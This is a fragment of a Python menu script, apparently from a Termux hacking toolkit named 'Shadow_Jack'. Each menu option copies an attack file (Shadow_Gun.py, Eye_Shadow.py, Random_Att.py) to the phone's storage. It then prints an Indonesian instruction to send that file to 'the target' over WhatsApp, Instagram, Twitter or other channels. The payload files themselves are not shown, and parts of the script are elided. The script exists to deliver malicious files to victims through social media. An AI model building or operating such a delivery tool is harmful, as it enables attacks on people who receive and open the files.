...
#~~~~~~~~~~~~~~~~~~~~~~~~
	...
	if sampul == (1):
		...
		print ('\n\n')
		system ('cd VF1')
		system ('cp -f /data/data/com.termux/files/home/Shadow_Jack/VF1/Shadow_Gun.py /sdcard/')
		print ('')
		...
		print ('\n\n')
		system ('cd VF1')
		system ('cp -f /data/data/com.termux/files/home/Shadow_Jack/VF1/Eye_Shadow.py /sdcard/')
		print ('')
		print('Silahkan Anda Kirim File Baru Yang Berada Di File Manager Anda Tersebut Ke Target\nPengiriman Bisa Lewat Mana Saja, Bisa WA, IG, Twitter, Dll.')
	elif sampul == (3):
		system ('clear')
		...
		print ('\n\n')
		system ('cd VF1')
		system ('cp -f /data/data/com.termux/files/home/Shadow_Jack/VF1/Random_Att.py /sdcard/')
		print ('')
		print('Silahkan Anda Kirim File Baru Yang Berada Di File Manager Anda Tersebut Ke Target\nPengiriman Bisa Lewat Mana Saja, Bisa WA, IG, Twitter, Dll.')
	else:
		Welcome()
